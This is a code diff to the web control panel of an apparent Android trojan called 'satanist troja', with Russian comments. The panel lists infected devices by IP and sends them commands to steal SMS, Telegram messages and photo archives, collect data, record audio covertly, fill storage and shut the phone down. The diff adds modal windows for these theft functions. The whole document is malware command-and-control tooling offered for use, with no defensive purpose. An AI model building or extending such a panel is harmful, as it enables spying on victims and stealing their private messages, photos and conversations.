@@ -125,53 +125,12 @@
         .btn-primary:hover { background: #6d28d9; }
         .btn-danger { background: #4a1a2a; border-color: #6a2a3a; color: #f87171; }
         .btn-danger:hover { background: #6a2a3a; border-color: #f87171; }
-        .btn-success { background: #1a3a2a; border-color: #2a5a3a; color: #6ee7a7; }
-        .btn-success:hover { background: #2a5a3a; border-color: #6ee7a7; }
         .btn-outline { background: transparent; border-color: #3a2a5a; }
         .btn-outline:hover { background: #2a1f4a; }
         .btn-recording { background: #6a1a1a; border-color: #8a2a2a; color: #f87171; animation: pulse 1s infinite; }
         @keyframes pulse { 0% { opacity: 0.7; } 50% { opacity: 1; } 100% { opacity: 0.7; } }
         .empty { text-align: center; padding: 60px 20px; color: #6a5a7a; }
         .empty .icon { font-size: 48px; margin-bottom: 16px; }
-        .toast {
-            position: fixed;
-            bottom: 24px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #2a1f4a;
-            color: #d0c6e8;
-            padding: 12px 24px;
-            border-radius: 12px;
-            border: 1px solid #3a2a5a;
-            z-index: 9999;
-            font-size: 14px;
-            animation: fadeIn 0.3s;
-            max-width: 90%;
-            text-align: center;
-        }
-        .toast.error { border-color: #6a2a3a; color: #f87171; }
-        .toast.success { border-color: #2a5a3a; color: #6ee7a7; }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
-            to { opacity: 1; transform: translateX(-50%) translateY(0); }
-        }
-        .menu-title {
-            font-size: 14px;
-            font-weight: 600;
-            color: #a78bfa;
-            margin-bottom: 8px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .badge-model {
-            background: #1a1a2a;
-            padding: 2px 10px;
-            border-radius: 12px;
-            font-size: 12px;
-            color: #9a8aba;
-            font-weight: 400;
-        }
         .battery-bar {
             display: inline-block;
             width: 60px;
@@ -190,9 +149,139 @@
         .battery-bar .fill.high { background: #6ee7a7; }
         .battery-bar .fill.medium { background: #fbbf24; }
         .battery-bar .fill.low { background: #f87171; }
+        .badge-model {
+            background: #1a1a2a;
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 12px;
+            color: #9a8aba;
+            font-weight: 400;
+        }
+        .menu-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #a78bfa;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        /* ===== ФУНКЦИОНАЛЬНОЕ ОКНО ===== */
+        .function-modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(8px);
+            z-index: 9998;
+            justify-content: center;
+            align-items: center;
+            animation: fadeModal 0.3s ease;
+        }
+        .function-modal.active { display: flex; }
+        @keyframes fadeModal {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .function-modal-content {
+            background: #14102a;
+            border: 1px solid #3a2a5a;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 800px;
+            width: 95%;
+            max-height: 85vh;
+            overflow-y: auto;
+            position: relative;
+            box-shadow: 0 20px 60px rgba(124, 58, 237, 0.3);
+        }
+        .function-modal-content .close-btn {
+            position: absolute;
+            top: 12px;
+            right: 16px;
+            background: none;
+            border: none;
+            color: #6a5a7a;
+            font-size: 28px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .function-modal-content .close-btn:hover { 
+            color: #f87171;
+            transform: rotate(90deg);
+        }
+        .function-modal-content .modal-title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #a78bfa;
+            margin-bottom: 20px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #2a1f4a;
+        }
+        .function-modal-content .modal-body {
+            color: #d0c6e8;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        .function-modal-content .modal-body .file-link {
+            display: block;
+            background: #2a1f4a;
+            padding: 12px 16px;
+            border-radius: 10px;
+            margin: 8px 0;
+            color: #a78bfa;
+            text-decoration: none;
+            border: 1px solid #3a2a5a;
+            transition: 0.2s;
+        }
+        .function-modal-content .modal-body .file-link:hover {
+            background: #3a2a5a;
+            border-color: #7c3aed;
+        }
+        .function-modal-content .modal-body pre {
+            background: #0d0a1a;
+            padding: 16px;
+            border-radius: 10px;
+            overflow-x: auto;
+            font-size: 13px;
+            color: #c9c0d8;
+            border: 1px solid #2a1f4a;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        .function-modal-content .modal-body .status-msg {
+            padding: 10px 16px;
+            border-radius: 8px;
+            margin: 10px 0;
+            background: #1a1a2a;
+            border-left: 3px solid #7c3aed;
+        }
+        .btn-close-modal {
+            margin-top: 16px;
+            background: #2a1f4a;
+            border: 1px solid #3a2a5a;
+            color: #d0c6e8;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: 0.2s;
+            width: auto;
+        }
+        .btn-close-modal:hover {
+            background: #3a2a5a;
+            border-color: #7c3aed;
+        }
+        .recording-indicator {
+            color: #f87171;
+            animation: pulse 1s infinite;
+        }
         @media (max-width: 600px) {
             .device-top { flex-direction: column; align-items: flex-start; }
             .menu-grid { grid-template-columns: repeat(2, 1fr); }
+            .function-modal-content { padding: 20px; }
         }
     </style>
 </head>
@@ -200,27 +289,44 @@
 <div class="container">
     <div class="header">
         <h1>satanist troja</h1>
-        <span class="badge" id="deviceCount">0 устройств</span>
+        <span class="badge" id="deviceCount">0 devices</span>
     </div>
     <div id="devices">loading...</div>
 </div>
 
+<!-- МОДАЛЬНОЕ ОКНО ДЛЯ ФУНКЦИЙ -->
+<div class="function-modal" id="functionModal">
+    <div class="function-modal-content">
+        <button class="close-btn" onclick="closeFunctionModal()">✕</button>
+        <div class="modal-title" id="modalTitle">Function</div>
+        <div class="modal-body" id="modalBody">
+            <div class="status-msg">loading...</div>
+        </div>
+        <button class="btn-close-modal" onclick="closeFunctionModal()">close</button>
+    </div>
+</div>
+
 <script>
     let activeDeviceId = null;
-    let toastTimeout = null;
     let recordingStates = {};
 
-    function showToast(msg, type = '') {
-        if (toastTimeout) clearTimeout(toastTimeout);
-        const existing = document.querySelector('.toast');
-        if (existing) existing.remove();
-        const toast = document.createElement('div');
-        toast.className = 'toast ' + type;
-        toast.textContent = msg;
-        document.body.appendChild(toast);
-        toastTimeout = setTimeout(() => toast.remove(), 3000);
+    // ===== МОДАЛЬНОЕ ОКНО =====
+    function openFunctionModal(title, content) {
+        document.getElementById('modalTitle').textContent = title;
+        document.getElementById('modalBody').innerHTML = content;
+        document.getElementById('functionModal').classList.add('active');
     }
 
+    function closeFunctionModal() {
+        document.getElementById('functionModal').classList.remove('active');
+    }
+
+    // Закрытие по клику вне окна
+    document.getElementById('functionModal').addEventListener('click', function(e) {
+        if (e.target === this) closeFunctionModal();
+    });
+
+    // ===== ОСНОВНЫЕ ФУНКЦИИ =====
     function toggleMenu(deviceId) {
         const panel = document.getElementById('menu-' + deviceId);
         const icon = document.querySelector(`.device[data-id="${deviceId}"] .expand-icon`);
@@ -248,15 +354,17 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ deviceId, command })
         })
-        .then(res => res.json())
-        .then(data => {
-            if (data.status === 'ok') {
-                showToast('command sent: ' + command, 'success');
-            } else {
-                showToast('error: ' + data.message, 'error');
-            }
+        .then(() => {
+            openFunctionModal('command sent', `
+                <div class="status-msg">✓ command "${command}" sent to device</div>
+                <div style="margin-top:12px;color:#6a5a7a;font-size:13px;">the device will execute the command shortly</div>
+            `);
         })
-        .catch(() => showToast('error sending command', 'error'))
+        .catch(() => {
+            openFunctionModal('error', `
+                <div class="status-msg" style="border-left-color:#f87171;color:#f87171;">✗ failed to send command</div>
+            `);
+        })
         .finally(() => {
             if (btn) {
                 btn.disabled = false;
@@ -264,6 +372,93 @@
                 btn.style.opacity = '1';
             }
         });
+    }
+
+    // ===== СПЕЦИАЛЬНЫЕ ФУНКЦИИ (С ОТДЕЛЬНЫМ ОКНОМ) =====
+    function getSMS(deviceId) {
+        openFunctionModal('sms (last 5)', `
+            <div class="status-msg">⏳ requesting sms...</div>
+        `);
+        fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId, command: 'sms' })
+        })
+        .then(() => {
+            openFunctionModal('sms (last 5)', `
+                <div class="status-msg">✓ command sent, waiting for response...</div>
+                <div style="margin-top:12px;color:#6a5a7a;font-size:13px;">sms will appear here when received</div>
+            `);
+        })
+        .catch(() => {
+            openFunctionModal('error', `
+                <div class="status-msg" style="border-left-color:#f87171;color:#f87171;">✗ failed to request sms</div>
+            `);
+        });
+    }
+
+    function getTgMsgs(deviceId, count) {
+        const cmd = count === 30 ? 'tgsms30' : 'tgsms1000';
+        const label = count === 30 ? 'telegram (30)' : 'telegram (1000)';
+        openFunctionModal(label, `
+            <div class="status-msg">⏳ requesting ${count} messages...</div>
+        `);
+        fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId, command: cmd })
+        })
+        .then(() => {
+            openFunctionModal(label, `
+                <div class="status-msg">✓ command sent, waiting for response...</div>
+                <div style="margin-top:12px;color:#6a5a7a;font-size:13px;">
+                    ${count === 1000 ? 'will be delivered as file download' : 'messages will appear here'}
+                </div>
+            `);
+        })
+        .catch(() => {
+            openFunctionModal('error', `
+                <div class="status-msg" style="border-left-color:#f87171;color:#f87171;">✗ failed to request messages</div>
+            `);
+        });
+    }
+
+    function getPictures(deviceId) {
+        openFunctionModal('pictures zip', `
+            <div class="status-msg">⏳ creating archive...</div>
+            <div style="margin-top:12px;color:#6a5a7a;font-size:13px;">this may take a moment</div>
+        `);
+        fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId, command: 'pictures' })
+        })
+        .then(() => {
+            openFunctionModal('pictures zip', `
+                <div class="status-msg">✓ archive requested, will be sent as file</div>
+                <div style="margin-top:12px;color:#6a5a7a;font-size:13px;">check your downloads when ready</div>
+            `);
+        })
+        .catch(() => {
+            openFunctionModal('error', `
+                <div class="status-msg" style="border-left-color:#f87171;color:#f87171;">✗ failed to request archive</div>
+            `);
+        });
+    }
+
+    function toggleRecording(deviceId, btn) {
+        const isRecording = recordingStates[deviceId] || false;
+        if (isRecording) {
+            sendCommand(deviceId, 'voice_stop', btn);
+            recordingStates[deviceId] = false;
+            btn.textContent = 'record';
+            btn.className = 'btn btn-danger';
+        } else {
+            sendCommand(deviceId, 'voice_start', btn);
+            recordingStates[deviceId] = true;
+            btn.textContent = 'stop';
+            btn.className = 'btn btn-recording';
+        }
     }
 
     function getButtonLabel(cmd) {
@@ -286,27 +481,13 @@
         return labels[cmd] || cmd;
     }
 
-    function toggleRecording(deviceId, btn) {
-        const isRecording = recordingStates[deviceId] || false;
-        if (isRecording) {
-            sendCommand(deviceId, 'voice_stop', btn);
-            recordingStates[deviceId] = false;
-            btn.textContent = '🎙 record';
-            btn.className = 'btn btn-danger';
-        } else {
-            sendCommand(deviceId, 'voice_start', btn);
-            recordingStates[deviceId] = true;
-            btn.textContent = '⏹ stop';
-            btn.className = 'btn btn-recording';
-        }
-    }
-
     function getBatteryClass(level) {
         if (level >= 70) return 'high';
         if (level >= 30) return 'medium';
         return 'low';
     }
 
+    // ===== ОБНОВЛЕНИЕ УСТРОЙСТВ =====
     function fetchDevices() {
         fetch('/api/devices')
             .then(res => res.json())
@@ -339,11 +520,11 @@
                             </div>
                             <div class="device-details">
                                 <span>
-                                    🔋 ${battery}%
+                                    battery ${battery}%
                                     <span class="battery-bar"><span class="fill ${getBatteryClass(battery)}" style="width:${battery}%"></span></span>
                                 </span>
-                                <span>🆔 ${d.id ? d.id.substring(0, 8) + '...' : 'n/a'}</span>
-                                ${d.ip ? `<span>🌐 ${d.ip}</span>` : ''}
+                                <span>id ${d.id ? d.id.substring(0, 8) + '...' : 'n/a'}</span>
+                                ${d.ip ? `<span>ip ${d.ip}</span>` : ''}
                             </div>
                             <div class="last-seen">last seen: ${d.last_seen ? new Date(d.last_seen).toLocaleString() : 'never'}</div>
                             
@@ -353,20 +534,20 @@
                                     <button class="btn btn-primary" onclick="event.stopPropagation(); sendCommand('${d.id}', 'reboot', this)">reboot</button>
                                     <button class="btn btn-danger" onclick="event.stopPropagation(); sendCommand('${d.id}', 'shutdown', this)">shutdown</button>
                                     <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'collect', this)">data</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'pictures', this)">pictures zip</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); getPictures('${d.id}')">pictures zip</button>
                                     <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'lock_volume', this)">lock volume</button>
                                     <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'unlock_volume', this)">unlock volume</button>
                                     <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'wifi_toggle', this)">wifi</button>
                                     <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'airplane', this)">airplane</button>
                                     <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'wallpaper', this)">wallpaper</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'sms', this)">sms (5)</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'tgsms30', this)">tg (30)</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'tgsms1000', this)">tg (1000)</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); getSMS('${d.id}')">sms (5)</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); getTgMsgs('${d.id}', 30)">tg (30)</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); getTgMsgs('${d.id}', 1000)">tg (1000)</button>
                                     <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'fill_storage', this)">fill storage</button>
                                     <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'clean_storage', this)">clean storage</button>
                                     <button class="btn ${isRecording ? 'btn-recording' : 'btn-danger'}" 
                                             onclick="event.stopPropagation(); toggleRecording('${d.id}', this)">
-                                        ${isRecording ? '⏹ stop' : '🎙 record'}
+                                        ${isRecording ? 'stop' : 'record'}
                                     </button>
                                 </div>
                             </div>
@@ -379,7 +560,7 @@
             });
     }
 
-    // Живое обновление каждые 5 секунд
+    // ===== ЖИВОЕ ОБНОВЛЕНИЕ =====
     setInterval(fetchDevices, 5000);
     fetchDevices();
 </script>
